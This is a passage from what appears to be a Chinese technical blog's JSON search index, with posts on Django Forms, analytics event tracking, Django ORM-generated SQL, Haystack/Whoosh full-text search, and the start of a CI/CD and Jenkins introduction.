forms.RegexField(min_length=3, max_length=16, label=u\u0026#39;昵称\u0026#39;, error_messages={ \u0026#39;required\u0026#39;: u\u0026#39;昵称不能为空，长度3~16中英文及_-\u0026#39;, \u0026#39;invalid\u0026#39;: u\u0026#39;请输入合法昵称（3~16位以内中英文字符）.\u0026#39; }, regex=cn8_re) # 指定函数校验validate_email，可以指定多个 email = forms.EmailField(validators=[validate_email]) # 指定为Choice gender = forms.ChoiceField(choices=SEXUAL_CHOICES, required=False, label=u\u0026#39;性别\u0026#39;) # 指定长度 password_0 = forms.RegexField(min_length=8, max_length=20, label=u\u0026#39;密码\u0026#39;, error_messages=\u0026#39;\u0026#39;egex=pwd_regex) password_1 = forms.RegexField(min_length=8, max_length=20, label=u\u0026#39;确认密码\u0026#39;, error_messages=\u0026#39;pwd_error_msg\u0026#39;, regex=pwd_regex) # 重载clean函数，实现自定义的校验 def clean(self): if self.cleaned_data.get(\u0026#39;password_0\u0026#39;) != self.cleaned_data.get(\u0026#39;password_1\u0026#39;): self.add_error(\u0026#39;password_1\u0026#39;, u\u0026#34;两次密码输入不匹配.\u0026#34;) raise ValidationError(u\u0026#34;两次密码输入不匹配.\u0026#34;) return self.cleaned_data Django Forms提供了大量的Field用于数据有效性校验， \u0026lsquo;Field\u0026rsquo;, \u0026lsquo;CharField\u0026rsquo;, \u0026lsquo;IntegerField\u0026rsquo;, \u0026lsquo;DateField\u0026rsquo;, \u0026lsquo;TimeField\u0026rsquo;, \u0026lsquo;DateTimeField\u0026rsquo;, \u0026lsquo;DurationField\u0026rsquo;, \u0026lsquo;RegexField\u0026rsquo;, \u0026lsquo;EmailField\u0026rsquo;, \u0026lsquo;FileField\u0026rsquo;, \u0026lsquo;ImageField\u0026rsquo;, \u0026lsquo;URLField\u0026rsquo;, \u0026lsquo;BooleanField\u0026rsquo;\u0026hellip;能满足绝大多数的场景。\n2.2 结合Model 如果 POST 提交的数据，是为了操作 Model 数据，为什么不能简单点，直接用 Model 初始化 Form 的字段呢？当然可以。\nmodels.py\n1 2 3 4 from django.db import models class Contact(models.Model): title = models.CharField(max_length=30) content = models.CharField(max_length=20) form.py\n1 2 3 4 5 6 from django.forms import ModelForm from .models import Contact class ConotactForm(ModelForm): class Meta: model = Contact field = (\u0026#39;title\u0026#39;,\u0026#39;content\u0026#39;) #只显示model中指定的字段 Form 只需要继承 ModelForm 类，并在 Meta 中指定映射的 Model，Django Forms 会自动在 Form 中添加 field 指定的字段。而不需要，像继承 forms.Form ，一个字段一个字段添加。\n","description":"","id":527,"section":"post","tags":["博文","Django","安全"],"title":"Django Forms 功能","uri":"https://www.chenshaowen.com/blog/django-forms-function.html"},{"content":"1. 名词解释 xpath ： 分为精确路径和概略路径两种做法。精确路径 ： body\u0026gt;div[0]\u0026gt;div[3]\u0026gt;ul\u0026gt;li[5]\u0026gt;a[0] ，从被点击的元素不断向上查找到根节点，并记录过程中每个节点。概略路径：body\u0026gt;div.header\u0026gt;div.nav\u0026gt;a[23]，在前者的基础上省略上溯路径中非白名单中的节点。 瞬发事件：点击等。 持续事件：页面滚动等。 全量日志：对页面采集到的所有事件进行上报。 埋点： 植入代码，对用户的行为进行记录。 点击埋点：用户进行了点击、刷新、触碰等主动操作后，打点。 例如：用户点击“注册”按钮，向服务器发送一条日志。 曝光埋点：当被埋点的数据得到展示的时候，打点。页面曝光，页面被展示的时候，打点。局部曝光，例如：用户浏览首页，看完第一屏，意犹未尽，于是翻页了，这时候发送一条曝光日志，表示第二屏的内容被用户看到了。 2. 前端埋点 2.1 代码埋点 在代码中，直接植入数据收集代码，抓取用户行为数据后上传。\n优点：数据采集的准确性、针对性强，数据处理方便。 缺点：埋点的代码入侵性强，采集的数据单一，当需求发生变化时，对代码改动较大。 2.2 可视化埋点 通过可视化工具，后台配置锚点并实时下发到客户端生效，前端自动解析配置并上传数据，例如，Mixpanel。\n优点：上手简单，可以自定义配置，不需要手工修改代码。 缺点：覆盖的功能有限的，并不是所有的控件操作都可以通过这种方案进行定制。 2.3 无埋点 无埋点的的技术方案，早在2013年就已被提出了。在客户端集成无埋点采集后，会尽可能多的收集数据，甚至不需要考虑埋点位置，也不需要配置埋点。当需要埋点数据时，只用筛选出相关数据即可。\n优点：无埋点解决了数据回溯的问题。不需要提前知道需求，先尽可能多的收集数据。 缺点：对数据传输和存储的要求高。 3. 后端埋点 后端埋点就是在服务端嵌入代码，收集数据。\n3.1. 前、后端埋点比较 后端埋点：\n用户体验影响小，对客户端网络等环境依赖少。 用户行为与数据无法很好关联。 数据完整性有保证，业务数据安全 前端埋点：\n能获取到前端界面设计相关信息 轻量，调试友好，可扩展性维护性好 4. 无埋点 4.1 无埋点的优势 代码入侵少：除了网络和CPU的开销，对客户端几乎无影响。 沟通成本低：不需要与各类人员沟通埋点的位置、采集的方式。 数据更全面：全量日志式的采集用户行为数据，将分析推迟，避免因缺少埋点产生的疏漏。 4.2 无埋点方案设计 无埋点设计方案主要从数据采集、分析、呈现三个方面，用户、应用、页面、元素四个维度对项目进行规划，横向对比组内同学提供的工具，指出可能融合的现有项目，同时也暴露项目的风险，提供项目以指导。\n设计方案 处理流程 数据流向 前端原型 关注点 5. 参考 https://help.growingio.com/ http://tech.meituan.com/mt-mobile-analytics-practice.html https://www.zhihu.com/question/38000812 https://my.oschina.net/leejun2005/blog/292709 ","description":"","id":528,"section":"post","tags":["博文","数据","设计","方案","Demo"],"title":"运营埋点与方案设计","uri":"https://www.chenshaowen.com/blog/operation-buried-point-and-design.html"},{"content":"1. 基本概念 ORM：对象关系映射，Object Relational Mapping。它的作用是在关系型数据库和对象之间作一个映射。不需要复杂的 SQL 语句，操作数据如同操作对象一样简单。 QuerySet：给定模型的对象列表。QuerySet 允许从数据库中读取数据，对其进行筛选、排序等操作。 Manager：django.db.models.manager.Manager，Django 用于表级功能的操作类。每个 model 都有一个默认的 Manager 实例，叫做 objects。 2. QuerySet Django ORM 用到三个类：Model、Manager、QuerySet。Model 是数据模型。Manager 定义表级方法，当需要定制时，以 models.Manager 为父类，定义自己的 Manager 类，增加表级方法。而这部分主要讨论的 queryset 就是 Manager 类的一些方法会返回的 QuerySet 实例，QuerySet 是一个可遍历结构，包含一个或多个元素，每个元素都是一个 Model 实例，它里面的方法也是表级方法。\nvalues_list 获取元组形式结果 1 2 3 In [1]: bs = Basket.objects.values_list(\u0026#39;weight\u0026#39;,\u0026#39;create_time\u0026#39;) In [2]: bs Out[2]: [(2.1, datetime.datetime(2017, 8, 15, 20, 14, 9))] values 获取字典形式的结果 1 2 3 In [1]: b = Basket.objects.values(\u0026#39;weight\u0026#39;,\u0026#39;create_time\u0026#39;) In [2]: b Out[2]: [{\u0026#39;create_time\u0026#39;: datetime.datetime(2017, 8, 15, 20, 14, 9), \u0026#39;weight\u0026#39;: 2.1}] extra 实现 别名，条件，排序 extra 中可实现别名、条件、排序等，后面两个用 filter、exclude 可以实现，排序用 order_by 可以实现。这里主要看一下别名功能：\n比如 Basket 中有 weight，需要重命名为 w。\n1 2 3 In [1]: b =Basket.objects.all().extra(select={\u0026#39;w\u0026#39;:\u0026#39;weight\u0026#39;}) Out[1]: b[0].w 2.1 annotate 聚合 计数，求和，平均数 以求和为例：\n1 2 3 In [1]:from django.db.models import Sum In [2]:Basket.objects.values(\u0026#39;weight\u0026#39;).annotate(sum_weight=Sum(\u0026#39;weight\u0026#39;)) Out[2]:[{\u0026#39;sum_weight\u0026#39;: 2.1, \u0026#39;weight\u0026#39;: 2.1}] select_related 优化一对一，多对一查询 一次查询，将外键数据获取到。\n1 2 3 In [1]:b = Basket.objects.all().select_related(\u0026#39;fruit\u0026#39;) In [2]:b[0].fruit.name Out[2]: u\u0026#39;apple\u0026#39; prefetch_related 优化一对多，多对多查询 prefetch_related 用于一对多、多对多 的情况，这时 select_related 用不了，因为当前一条有好几条与之相关的内容。prefetch_related 是通过再执行一条额外的SQL语句，然后用 Python 把两次SQL查询的内容关联（joining）到一起。\ndefer 排除不需要的字段 在复杂的情况下，表中可能有些字段内容非常多，取出来转化成 Python 对象会占用大量的资源，defer 可以排除掉部分字段。\nonly 仅选择需要的字段 和 defer 相反，only 用于取出需要的字段。\n自定义聚合功能 django.db.models 中有 Count, Avg, Sum 等。但是，有一些没有，比如 GROUP_CONCAT。这可以自定义 GroupConcat 类来实现相关功能。\n缓存 当遍历 queryset 时，所有匹配的记录会从数据库获取，然后转换成 Django 的 model 。这些 model 会保存在 queryset 内置的 cache 中，这样如果再次遍历这个 queryset，不需要重复运行通用的查询。\n1 2 3 4 5 6 7 b_set = Basket.objects.all() # The query is executed and cached. for b in b_set : print(b.create_time) # The cache is used for subsequent iteration. for b in b_set : print(b.weight) 3. Django 常用操作对应的 SQL 语句 首先，新建两个 models：\n1 2 3 4 5 6 7 8 class Fruit(models.Model): name = models.CharField(u\u0026#39;名称\u0026#39;, default=\u0026#34;\u0026#34;, max_length=255) price = models.FloatField(u\u0026#34;单价\u0026#34;, default=0) class Basket(models.Model): create_time = models.DateTimeField(u\u0026#39;新增时间\u0026#39;, auto_now_add=True) fruit = models.ForeignKey(Fruit) weight = models.FloatField(default=0.0) Django 提供了 Shell 调试环境，输入命令：\n1 python manage.py shell 可以进入 Console ，使用命令行操作 Django DB。\n1 2 3 4 5 6 7 8 9 In [1]：from home_application.models import Basket In [2]：Basket.objects.all() Out[2]: [\u0026lt;Basket: Basket object\u0026gt;] In [3]：from django.db import connection In [4]：connection.queries Out[4]: [{u\u0026#39;sql\u0026#39;: u\u0026#39;SET SQL_AUTO_IS_NULL = 0\u0026#39;, u\u0026#39;time\u0026#39;: u\u0026#39;0.001\u0026#39;}, {u\u0026#39;sql\u0026#39;: u\u0026#39;SELECT `home_application_basket`.`id`, `home_application_basket`.`create_time`, `home_application_basket`.`fruit_id`, `home_application_basket`.`weight` FROM `home_application_basket` LIMIT 21\u0026#39;, u\u0026#39;time\u0026#39;: u\u0026#39;0.002\u0026#39;}] 使用 connection.queries 可以查看到历史的 SQL 执行语句。为了仅显示当前操作的 SQL，这里每次查看 SQL 之后，使用 db.reset_queries() 清理一下 connection.queries。\n还有一种方法可以获取当前 ORM 操作的 SQL 语句 print Basket.objects.all().query。通过控制台直接打印查询集的 query 属性，输出：\n1 SELECT `home_application_basket`.`id`, `home_application_basket`.`create_time`, `home_application_basket`.`fruit_id`, `home_application_basket`.`weight` FROM `home_application_basket` 下面，看下常见的 Django ORM 操作生成的 SQL ：\n批量查询 - filter 1 2 3 4 5 6 7 In [1]：from django import db In [2]：db.reset_queries() In [3]：Basket.objects.filter(weight=2.1) In [4]：connection.queries Out[4]: [{u\u0026#39;sql\u0026#39;: u\u0026#39;SELECT `home_application_basket`.`id`, `home_application_basket`.`create_time`, `home_application_basket`.`fruit_id`, `home_application_basket`.`weight` FROM `home_application_basket` WHERE `home_application_basket`.`weight` = 2.1 LIMIT 21\u0026#39;, u\u0026#39;time\u0026#39;: u\u0026#39;0.001\u0026#39;}] 查询单个对象 - get 1 2 3 4 5 6 In [1]：db.reset_queries() In [2]：Basket.objects.get(weight=2.1) In [3]：connection.queries Out[3]: [{u\u0026#39;sql\u0026#39;: u\u0026#39;SELECT `home_application_basket`.`id`, `home_application_basket`.`create_time`, `home_application_basket`.`fruit_id`, `home_application_basket`.`weight` FROM `home_application_basket` WHERE `home_application_basket`.`weight` = 2.1\u0026#39;, u\u0026#39;time\u0026#39;: u\u0026#39;0.000\u0026#39;}] 范围查询 - gt、lt Django 中使用在字段名称后面追加 __gt、__lt 来实现，范围查询。\n1 2 3 4 5 6 In [1]：db.reset_queries() In [2]：Basket.objects.filter(create_time__gte=\u0026#39;1999-01-01\u0026#39;) In [3]：connection.queries Out[3]: [{u\u0026#39;sql\u0026#39;: u\u0026#34;SELECT `home_application_basket`.`id`, `home_application_basket`.`create_time`, `home_application_basket`.`fruit_id`, `home_application_basket`.`weight` FROM `home_application_basket` WHERE `home_application_basket`.`create_time` \u0026gt;= \u0026#39;1999-01-01 00:00:00\u0026#39; LIMIT 21\u0026#34;, u\u0026#39;time\u0026#39;: u\u0026#39;0.001\u0026#39;}] 1 2 3 4 5 6 In [1]：db.reset_queries() In [2]：Basket.objects.exclude(create_time__gte=\u0026#39;1999-01-01\u0026#39;) In [3]：connection.queries Out[3]: [{u\u0026#39;sql\u0026#39;: u\u0026#34;SELECT `home_application_basket`.`id`, `home_application_basket`.`create_time`, `home_application_basket`.`fruit_id`, `home_application_basket`.`weight` FROM `home_application_basket` WHERE NOT (`home_application_basket`.`create_time` \u0026gt;= \u0026#39;1999-01-01 00:00:00\u0026#39;) LIMIT 21\u0026#34;, u\u0026#39;time\u0026#39;: u\u0026#39;0.000\u0026#39;}] 通过外键组合查询 - __ 1 2 3 4 5 6 7 In [1]：db.reset_queries() In [2]：Basket.objects.filter(fruit__name=\u0026#34;apple\u0026#34;) In [3]：connection.queries Out[3]: [{u\u0026#39;sql\u0026#39;: u\u0026#34;SELECT `home_application_basket`.`id`, `home_application_basket`.`create_time`, `home_application_basket`.`fruit_id`, `home_application_basket`.`weight` FROM `home_application_basket` INNER JOIN `home_application_fruit` ON ( `home_application_basket`.`fruit_id` = `home_application_fruit`.`id` ) WHERE `home_application_fruit`.`name` = \u0026#39;apple\u0026#39; LIMIT 21\u0026#34;, u\u0026#39;time\u0026#39;: u\u0026#39;0.001\u0026#39;}] 多条件或查询 - Q 1 2 3 4 5 6 7 In [1]：db.reset_queries() In [2]：from django.db.models import Q In [3]：Basket.objects.filter(Q(weight=2.1) | Q(weight=2.0)) In [4]：connection.queries Out[4]: [{u\u0026#39;sql\u0026#39;: u\u0026#39;SELECT `home_application_basket`.`id`, `home_application_basket`.`create_time`, `home_application_basket`.`fruit_id`, `home_application_basket`.`weight` FROM `home_application_basket` WHERE (`home_application_basket`.`weight` = 2.1 OR `home_application_basket`.`weight` = 2) LIMIT 21\u0026#39;, u\u0026#39;time\u0026#39;: u\u0026#39;0.001\u0026#39;}] in查询 - in 1 2 3 4 5 6 In [1]：db.reset_queries() In [2]：Basket.objects.filter(weight__in=[2.1, 2.0]) In [3]：connection.queries Out[3]: [{u\u0026#39;sql\u0026#39;: u\u0026#39;SELECT `home_application_basket`.`id`, `home_application_basket`.`create_time`, `home_application_basket`.`fruit_id`, `home_application_basket`.`weight` FROM `home_application_basket` WHERE `home_application_basket`.`weight` IN (2.1, 2) LIMIT 21\u0026#39;, u\u0026#39;time\u0026#39;: u\u0026#39;0.001\u0026#39;}] like查询 - like 1 2 3 4 5 6 In [1]：db.reset_queries() In [2]：Basket.objects.filter(weight__contains=\u0026#39;2\u0026#39;) In [3]：connection.queries Out[3]: [{u\u0026#39;sql\u0026#39;: u\u0026#34;SELECT `home_application_basket`.`id`, `home_application_basket`.`create_time`, `home_application_basket`.`fruit_id`, `home_application_basket`.`weight` FROM `home_application_basket` WHERE `home_application_basket`.`weight` LIKE BINARY \u0026#39;%2%\u0026#39; LIMIT 21\u0026#34;, u\u0026#39;time\u0026#39;: u\u0026#39;0.001\u0026#39;}] 统计个数 - count 1 2 3 4 5 6 In [1]：db.reset_queries() In [2]：Basket.objects.filter(weight=2.1).count() In [3]：connection.queries Out[3]: [{u\u0026#39;sql\u0026#39;: u\u0026#34;SELECT COUNT(\u0026#39;*\u0026#39;) AS `__count` FROM `home_application_basket` WHERE `home_application_basket`.`weight` = 2.1\u0026#34;, u\u0026#39;time\u0026#39;: u\u0026#39;0.002\u0026#39;}] 结果排序 - order_by 1 2 3 4 5 6 In [1]：db.reset_queries() In [2]：Basket.objects.all().order_by(\u0026#39;create_time\u0026#39;) In [3]：connection.queries Out[3]: [{u\u0026#39;sql\u0026#39;: u\u0026#39;SELECT `home_application_basket`.`id`, `home_application_basket`.`create_time`, `home_application_basket`.`fruit_id`, `home_application_basket`.`weight` FROM `home_application_basket` ORDER BY `home_application_basket`.`create_time` ASC LIMIT 21\u0026#39;, u\u0026#39;time\u0026#39;: u\u0026#39;0.001\u0026#39;}] 1 2 3 4 5 6 In [1]：db.reset_queries() In [2]：Basket.objects.all().order_by(\u0026#39;create_time\u0026#39;, \u0026#39;-weight\u0026#39;) In [3]：connection.queries Out[3]: [{u\u0026#39;sql\u0026#39;: u\u0026#39;SELECT `home_application_basket`.`id`, `home_application_basket`.`create_time`, `home_application_basket`.`fruit_id`, `home_application_basket`.`weight` FROM `home_application_basket` ORDER BY `home_application_basket`.`create_time` ASC, `home_application_basket`.`weight` DESC LIMIT 21\u0026#39;, u\u0026#39;time\u0026#39;: u\u0026#39;0.001\u0026#39;}] 修改数据 - save 1 2 3 4 5 6 7 8 9 10 In [1]：db.reset_queries() In [2]：b = Basket.objects.get(pk=1) In [3]：b.weight = 2.0 In [4]：b.save() In [5]：connection.queries Out[5]: [{u\u0026#39;sql\u0026#39;: u\u0026#39;SELECT `home_application_basket`.`id`, `home_application_basket`.`create_time`, `home_application_basket`.`fruit_id`, `home_application_basket`.`weight` FROM `home_application_basket` WHERE `home_application_basket`.`id` = 1\u0026#39;, u\u0026#39;time\u0026#39;: u\u0026#39;0.001\u0026#39;}, {u\u0026#39;sql\u0026#39;: u\u0026#34;UPDATE `home_application_basket` SET `create_time` = \u0026#39;2017-08-08 18:00:59\u0026#39;, `fruit_id` = 1, `weight` = 2 WHERE `home_application_basket`.`id` = 1\u0026#34;, u\u0026#39;time\u0026#39;: u\u0026#39;0.003\u0026#39;}] 批量修改 - update 1 2 3 4 5 6 In [1]：db.reset_queries() In [2]：Basket.objects.filter(weight=2.0).update(weight=2.1) In [3]：connection.queries Out[3]: [{u\u0026#39;sql\u0026#39;: u\u0026#39;UPDATE `home_application_basket` SET `weight` = 2.1 WHERE `home_application_basket`.`weight` = 2\u0026#39;, u\u0026#39;time\u0026#39;: u\u0026#39;0.003\u0026#39;}] 批量删除 - delete 1 2 3 4 5 6 In [1]：db.reset_queries() In [2]：Basket.objects.filter(weight=2.1).delete() In [3]：connection.queries Out[3]: [{u\u0026#39;sql\u0026#39;: u\u0026#39;DELETE FROM `home_application_basket` WHERE `home_application_basket`.`weight` = 2.1\u0026#39;, u\u0026#39;time\u0026#39;: u\u0026#39;0.003\u0026#39;}] 提前 filter 需要处理的对象并不能减少 SQL 查询 可以看到如果不使用查询对象，不会产生 SQL 查询。仅当对查询集进行操作时，SQL 才会开始查询。将查询集保存，是为了利用内置的 Cache。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 In [1]：db.reset_queries() In [2]：all = Basket.objects.all() In [3]：connection.queries Out [3]: [] In [4]: all In [5]：connection.queries Out [5]: [{u\u0026#39;sql\u0026#39;: u\u0026#39;SELECT `home_application_basket`.`id`, `home_application_basket`.`create_time`, `home_application_basket`.`fruit_id`, `home_application_basket`.`weight` FROM `home_application_basket` LIMIT 21\u0026#39;, u\u0026#39;time\u0026#39;: u\u0026#39;0.000\u0026#39;}] In [6]: all.filter(weight=2.1) Out [6]: [{u\u0026#39;sql\u0026#39;: u\u0026#39;SELECT `home_application_basket`.`id`, `home_application_basket`.`create_time`, `home_application_basket`.`fruit_id`, `home_application_basket`.`weight` FROM `home_application_basket` LIMIT 21\u0026#39;, u\u0026#39;time\u0026#39;: u\u0026#39;0.000\u0026#39;}, {u\u0026#39;sql\u0026#39;: u\u0026#39;SELECT `home_application_basket`.`id`, `home_application_basket`.`create_time`, `home_application_basket`.`fruit_id`, `home_application_basket`.`weight` FROM `home_application_basket` WHERE `home_application_basket`.`weight` = 2.1 LIMIT 21\u0026#39;, u\u0026#39;time\u0026#39;: u\u0026#39;0.000\u0026#39;}] 4. SQL 执行性能 合理加索引 除了 ID 字段，其他字段默认不建立索引。通过设置，db_index 属性，可以自行添加索引，对 filter()、exclude()、order_by() 操作会有显著性能提升，例如：models.DateField(db_index=True)。\n利用 QuerySet Lazy特性 以下七种情况, 会查询数据库并生成cache, 不用再重新连数据库进行查询\nIteration, ie. 对Queryset进行For循环的操作. slicing, e.g. Entry.objects.all()[:5], 获取 queryset 中的前五个对象, 相当于 SQL 中的\nLIMIT 5 picling/caching repr/str len (Note: 如果你只想知道这个queryset结果的长度的话, 最高效的还是在数据库的层级调用count()方法, 也就是sql中的COUNT(). ) list() bool()\n比如： 1 2 3 \u0026gt;\u0026gt;\u0026gt; queryset = Entry.objects.all() \u0026gt;\u0026gt;\u0026gt; print([p.headline for p in queryset]) # Evaluate the query set. \u0026gt;\u0026gt;\u0026gt; print([p.pub_date for p in queryset]) # Re-use the cache from the evaluation. 一次性拿出所有数据，不去取那些不需要的数据 使用 select_related()、prefetch_related() 、 values_list()、values()方法\n如果查出的 queryset 只用一次， 可以使用 iterator() 去来防止占用太多的内存\nbulk（批量）地去 insert、update和delete数据\n用 count() 代替len(queryset)，用 exists() 代替if queryset\n5. 参考 https://github.com/jazzband/django-model-utils http://www.zlovezl.cn/articles/sqlalchemy-intro-for-django-guys/ http://code.ziqiangxuetang.com/django/django-queryset-advance.html http://www.cnblogs.com/ajianbeyourself/p/3604332.html http://code.ziqiangxuetang.com/django/django-queryset-advance.html http://coolshell.cn/articles/1846.html ","description":"","id":529,"section":"post","tags":["博文","Django","数据","Demo","SQL"],"title":"Django ORM 之 SQL","uri":"https://www.chenshaowen.com/blog/sql-code-about-django-orm.html"},{"content":" 简单介绍一下项目需求: 项目组需要对外发布文档，文档撰写使用的是Markdown，对外需要使用HTML。起初，使用的是Nginx+Jekyll的解决方案。随着文档的增加，文档系统对搜索功能有了强烈的需求。笔者在另外一篇文章中有所讨论，但是这几种方案，有的搜索效果不理想，有的需要依赖其他服务，显得有些重。于是，便有了本文的实施方案。\n1. 工具介绍 Whoosh是一个纯Python实现的全文搜索组件。Whoosh不但功能完善，而且速度很快。 Haystack是一个第三方的Django app，提供全文检索功能。可以对Model里面的内容进行索引、搜索。同时，Django-haystack支持Whoosh、Solr、Xapian、Elasticsearc四种全文检索引擎后端，实质上是一种全文检索的框架，使用时可以自由选择搭配。 Jieba是一个Python中文分词组件，其包含多种功能，本文使用了其中的ChineseAnalyzer中文分词功能。 2. 设计方案 方案思路\n1.将Jekyll作为Markdown转HTML的工具，最终得到本地所见即所得的HTML文档 2.使用Python爬虫工具BeautifulSoup，将静态的HTML解析后导入DB 3.通过Jieba分词，利用Whoosh建立查询索引 4.直接通过Django匹配.html的URL，从数据库中获取数据，对外提供文档服务，可以确保Nginx+Jekyll方案的链接依然有效。 3. 实施方案 3.1 创建文档 app 在项目目录，创建一个 Django app，命名：document。文档系统为两级目录结构，第一级为分类，第二级为文档。\n例如：\ndoc/type1/aaa.html doc/type2/bbb.html document/models.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 from django.db import models class Document(models.Model): \u0026#39;\u0026#39;\u0026#39; @summary: jekyll生成的文档 \u0026#39;\u0026#39;\u0026#39; file_name = models.CharField(u\u0026#39;文件名\u0026#39;, max_length=255) uri = models.CharField(u\u0026#39;URI\u0026#39;, max_length=255) tag = models.CharField(u\u0026#39;标签\u0026#39;, max_length=255) title = models.CharField(u\u0026#39;标题\u0026#39;, max_length=255) doc_html_text = models.TextField(u\u0026#39;文档（txt格式）\u0026#39;) doc_html = models.TextField(u\u0026#39;文档（HTML格式）\u0026#39;) doc_html_all = models.TextField(u\u0026#39;整个文档（HTML格式）\u0026#39;) created_time = models.DateTimeField(u\u0026#39;创建时间\u0026#39;, auto_now_add=True) 3.2 读取HTML 这里利用BeautifulSoup对HTML文件中的内容，进行了简单的筛选。是为了剔除导航部分的文本内容，增加搜索匹配的准确度。文档内容被markdown-body类包裹，标题被bk-title-style detail-title-right类包裹。\ndocument/utils.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # -*- coding: utf-8 -*- import os import copy from bs4 import BeautifulSoup from .models import Document PROJECT_ROOT = os.path.dirname(os.path.abspath(__file__)) PROJECT_DIR, PROJECT_MODULE_NAME = os.path.split(PROJECT_ROOT) def import_html_to_db(path=[], tag=\u0026#39;\u0026#39;): root_path = os.path.join(PROJECT_DIR, *path) for root, dirs, files in os.walk(root_path, True): for file in files: if file.find(\u0026#39;.\u0026#39;) and file.split(\u0026#39;.\u0026#39;)[-1] == \u0026#39;html\u0026#39;: _root = copy.deepcopy(root) _uri = _root.replace(root_path, \u0026#39;\u0026#39;) if _uri.startswith(os.path.sep): _uri = _uri[1:] with open(os.path.join(PROJECT_ROOT, root, file)) as _f: _doc_html = _f.read() doc_html_obj = BeautifulSoup(_doc_html) if doc_html_obj.find_all(\u0026#39;div\u0026#39;, class_=\u0026#39;markdown-body\u0026#39;): Document.objects.create( file_name=file, uri=_uri, tag=tag, title=doc_html_obj.find_all(\u0026#39;h3\u0026#39;, class_=\u0026#39;bk-title-style detail-title-right\u0026#39;)[0].text, doc_html=doc_html_obj.find_all(\u0026#39;div\u0026#39;, class_=\u0026#39;markdown-body\u0026#39;)[0], doc_html_text=doc_html_obj.find_all(\u0026#39;div\u0026#39;, class_=\u0026#39;markdown-body\u0026#39;)[0].text.replace(\u0026#39;\\n\u0026#39;, \u0026#39; \u0026#39;), doc_html_all=_doc_html ) 3.3 安装配置haystack 安装依赖包 1 2 3 pip install django-haystack pip install whoosh pip install jieba 配置索引 document/search_indexes.py，文件名一定要为search_indexes.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 # -*- coding: utf-8 -*- from haystack import indexes from .models import Document class DocumentIndex(indexes.SearchIndex, indexes.Indexable): text = indexes.CharField(document=True, use_template=True) doc_html = indexes.CharField(model_attr=\u0026#39;doc_html\u0026#39;) def get_model(self): return Document def index_queryset(self, using=None): return self.get_model().objects.all() 配置搜索引擎 拷贝haystack/backends/whoosh_backend.py，重命名为document/whoosh_cn_backend。将分词器改为jieba，默认的分词器对中文支持不友好。\n仅需要将原来的import StemmingAnalyzer，替换为jieba的ChineseAnalyzer即可。\n1 2 # from whoosh.analysis import StemmingAnalyzer from jieba.analyse import ChineseAnalyzer as StemmingAnalyzer settings.py配置 1 2 3 4 5 6 7 8 9 INSTALLED_APPS_CUSTOM = ( \u0026#39;haystack\u0026#39; ) HAYSTACK_CONNECTIONS = { \u0026#39;default\u0026#39;: { \u0026#39;ENGINE\u0026#39;: \u0026#39;document.whoosh_cn_backend.WhooshEngine\u0026#39;, \u0026#39;PATH\u0026#39;: os.path.join(os.path.dirname(__file__), \u0026#39;whoosh_index\u0026#39;), }, } 生成索引 1 python manage.py rebuild_index 执行命令后，settings.py同目录下，生成文件夹whoosh_index，包含索引信息。\n变更时，自动更新索引 settings.py中配置\n1 HAYSTACK_SIGNAL_PROCESSOR = \u0026#39;haystack.signals.RealtimeSignalProcessor\u0026#39; 4. Django中使用 4.1 使用haystack默认路由 配置urls.py 1 url(r\u0026#39;^search/\u0026#39;, include(\u0026#39;haystack.urls\u0026#39;)), 在模板目录，新增查询相关字段配置、模板 template/search/search.html，模板文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;form method=\u0026#34;get\u0026#34; action=\u0026#34;\u0026#34;\u0026gt; \u0026lt;table\u0026gt; {{ form.as_table }} \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;td\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Search\u0026#34;\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;h3\u0026gt;结果\u0026lt;/h3\u0026gt; {% for result in page.object_list %} \u0026lt;a href=\u0026#34;/document/{{result.uri}}/{{result.file_name}\u0026#34;\u0026gt;{{ result.object.title }}\u0026lt;/a\u0026gt;\u0026lt;br/\u0026gt; {% empty %} \u0026lt;p\u0026gt;没有搜索到结果.\u0026lt;/p\u0026gt; {% endfor %} \u0026lt;/form\u0026gt; template/search/indexes/document/document_text.txt，查询字段配置\n注意这里的子目录indexes，文件夹名是约定的，必须按照这样的格式。第一个document为Django app名，第二个document为Model表名，后缀_text。文本中，配置建立索引的字段。\n1 2 {{ object.doc_html_text }} {{ object.title }} 4.2 自定义View API haystack也提供了，查询函数用于获取匹配的Model对象。\n1 2 3 4 5 6 7 8 9 10 11 12 13 from django.shortcuts import render from haystack.forms import ModelSearchForm from haystack.query import SearchQuerySet def search(request): page_size = int(request.GET.get(\u0026#39;page_size\u0026#39;, \u0026#39;10\u0026#39;)) page_num = int(request.GET.get(\u0026#39;page\u0026#39;, \u0026#39;1\u0026#39;)) form = ModelSearchForm(request.GET, searchqueryset=None, load_all=True) searchqueryset = form.search() results = [r.pk for r in searchqueryset] docs = Document.objects.filter(tag=request.TAG, pk__in=results)[(page_num - 1) * page_size: page_num * page_size] return render(request, \u0026#39;search/search.html\u0026#39;, {\u0026#39;docs\u0026#39;: docs,\u0026#39;total\u0026#39;: len(docs)}) ","description":"","id":530,"section":"post","tags":["博文","Django","数据","方案","检索"],"title":"Haystack 全文检索","uri":"https://www.chenshaowen.com/blog/haystack-full-text-search.html"},{"content":"1. 基本概念 持续集成，Continuous Integration 持续集成强调开发人员提交了新代码之后，立刻进行构建、（单元）测试。根据测试结果，我们可以确定新代码和原有代码能否正确地集成在一起。\n持续交付，Continuous Delivery 持续交付在持续集成的基础上，将集成后的代码部署到更贴近真实运行环境的类生产环境中。比如，我们完成单元测试后，可以把代码部署到连接数据库的 Staging 环境中更多的测试。如果代码没有问题，可以继续手动部署到生产环境中。\n持续部署，Continuous Deployment 持续部署则是在持续交付的基础上，把部署到生产环境的过程自动化。\n2. Jenkins 2.1 Jenkins 简介 Jenkins 是一个用 Java 编写的开源的持续集成工具。在与 Oracle 发生争执后，2011年1月11日，社区投票将项目名称从 “Hudson” 变更为 “Jenkins” 。\nJenkins 提供了软件开发的持续集成服务。它运行在 Servlet 容器中（就像 